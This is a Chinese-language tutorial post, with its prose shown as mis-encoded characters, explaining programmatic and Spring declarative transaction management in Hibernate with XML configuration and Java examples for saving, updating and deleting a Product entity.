data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ53ï¼‰Hibernateçš„äº‹åŠ¡ç®¡ç†å¦‚ä½•å®ç°ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T11:55:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ53ï¼‰Hibernateçš„äº‹åŠ¡ç®¡ç†å¦‚ä½•å®ç°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:55:03.000Z" title="Tue Jan 20 2026 11:55:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateçš„äº‹åŠ¡ç®¡ç†æ˜¯ç¡®ä¿ä¸€ç»„æ•°æ®åº“æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼ˆå›æ»šï¼‰çš„æœºåˆ¶ã€‚å®ƒåœ¨ç¡®ä¿æ•°æ®ä¸€è‡´æ€§å’Œå®Œæ•´æ€§æ–¹é¢èµ·ç€å…³é”®ä½œç”¨ã€‚Hibernateæ”¯æŒå¤šç§äº‹åŠ¡ç®¡ç†æ–¹å¼ï¼Œå¦‚ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†å’Œå£°æ˜å¼äº‹åŠ¡ç®¡ç†ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†çš„äº‹åŠ¡ç®¡ç†å®ç°å’Œä»£ç ç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-0">1. ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†</h3>
<p>ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†æ˜¯æŒ‡åœ¨ä»£ç ä¸­æ˜¾å¼åœ°æ§åˆ¶äº‹åŠ¡çš„å¼€å§‹ã€æäº¤å’Œå›æ»šã€‚é€‚ç”¨äºç®€å•åº”ç”¨æˆ–éœ€è¦ç²¾ç¡®æ§åˆ¶äº‹åŠ¡è¾¹ç•Œçš„åœºæ™¯ã€‚</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†çš„å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateTransactionExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªäº§å“</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// ä¿å­˜äº§å“</span>
        saveProduct(product);
        
        <span class="hljs-comment">// æ›´æ–°äº§å“</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        updateProduct(product);
        
        <span class="hljs-comment">// åˆ é™¤äº§å“</span>
        deleteProduct(product.getId());

        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.save(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.update(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                session.delete(product);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. å£°æ˜å¼äº‹åŠ¡ç®¡ç†</h3>
<p>å£°æ˜å¼äº‹åŠ¡ç®¡ç†åœ¨Springæ¡†æ¶ä¸­å¾ˆå¸¸è§ï¼Œé€šè¿‡æ³¨è§£æˆ–XMLé…ç½®æ¥ç®¡ç†äº‹åŠ¡ã€‚å®ƒä¸éœ€è¦æ˜¾å¼çš„äº‹åŠ¡ç®¡ç†ä»£ç ï¼Œæ›´ç®€æ´ä¸”æ˜“äºç»´æŠ¤ã€‚</p>
<h4 data-id="heading-5">Springé…ç½®</h4>
<p>åœ¨Springçš„é…ç½®æ–‡ä»¶<code>applicationContext.xml</code>ä¸­é…ç½®äº‹åŠ¡ç®¡ç†ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans"</span>
       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">"http://www.springframework.org/schema/context"</span>
       <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">"http://www.springframework.org/schema/tx"</span>
       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Hibernate SessionFactory --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.LocalSessionFactoryBean"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"dataSource"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"packagesToScan"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.example.domain"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernateProperties"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- DataSource --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driverClassName"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"jdbc:mysql://localhost:3306/your_database"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_username"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_password"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Transaction Manager --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"transactionManager"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.HibernateTransactionManager"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"sessionFactory"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Enable annotation-driven transaction management --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tx:annotation-driven</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- Service layer beans --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"productService"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.service.ProductService"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">å®ä½“ç±»å®šä¹‰</h4>
<p>ä¸ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†ä¸­çš„å®ä½“ç±»å®šä¹‰ç›¸åŒï¼Œè¿™é‡Œä¸å†é‡å¤ã€‚</p>
<h4 data-id="heading-7">æœåŠ¡å±‚å®šä¹‰</h4>
<p>åœ¨æœåŠ¡å±‚ä¸­ä½¿ç”¨<code>@Transactional</code>æ³¨è§£æ¥ç®¡ç†äº‹åŠ¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Session;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.save(product);
        System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.update(product);
        System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            session.delete(product);
            System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-8">ä½¿ç”¨æœåŠ¡å±‚</h4>
<p>åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ä½¿ç”¨æœåŠ¡å±‚æ¥è¿›è¡Œæ•°æ®åº“æ“ä½œï¼Œäº‹åŠ¡ç®¡ç†ç”±Springè‡ªåŠ¨å¤„ç†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;
<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringHibernateTransactionExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"applicationContext.xml"</span>);
        <span class="hljs-type">ProductService</span> <span class="hljs-variable">productService</span> <span class="hljs-operator">=</span> context.getBean(ProductService.class);

        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªäº§å“</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// ä¿å­˜äº§å“</span>
        productService.saveProduct(product);

        <span class="hljs-comment">// æ›´æ–°äº§å“</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        productService.updateProduct(product);

        <span class="hljs-comment">// åˆ é™¤äº§å“</span>
        productService.deleteProduct(product.getId());
    }
}
</code></pre>
<h3 data-id="heading-9">æ€»ç»“</h3>
<ol>
<li><strong>ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†</strong>ï¼šåœ¨ä»£ç ä¸­æ˜¾å¼åœ°æ§åˆ¶äº‹åŠ¡çš„å¼€å§‹ã€æäº¤å’Œå›æ»šï¼Œé€‚ç”¨äºç®€å•åº”ç”¨æˆ–éœ€è¦ç²¾ç¡®æ§åˆ¶äº‹åŠ¡è¾¹ç•Œçš„åœºæ™¯ã€‚</li>
<li><strong>å£°æ˜å¼äº‹åŠ¡ç®¡ç†</strong>ï¼šé€šè¿‡Springæ¡†æ¶çš„æ³¨è§£æˆ–XMLé…ç½®æ¥ç®¡ç†äº‹åŠ¡ï¼Œä¸éœ€è¦æ˜¾å¼çš„äº‹åŠ¡ç®¡ç†ä»£ç ï¼Œæ›´ç®€æ´ä¸”æ˜“äºç»´æŠ¤ã€‚</li>
</ol>
<p>é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†Hibernateåº”ç”¨ç¨‹åºä¸­çš„äº‹åŠ¡ï¼Œç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚å¸Œæœ›è¿™äº›è¯¦ç»†çš„è§£é‡Šå’Œä»£ç ç¤ºä¾‹èƒ½å¸®åŠ©æ‚¨æ›´å¥½åœ°ç†è§£å’Œåº”ç”¨Hibernateçš„äº‹åŠ¡ç®¡ç†æŠ€æœ¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ54ï¼‰Hibernateä¸­çš„æ‰¹é‡æ›´æ–°å¦‚ä½•å®ç°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597283981184860212</link>    <guid>https://juejin.cn/post/7597283981184860212</guid>    <pubDate>2026-01-20T11:55:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981184860212" data-draft-id="7597270795211980840" data-original-type="0" class="article" 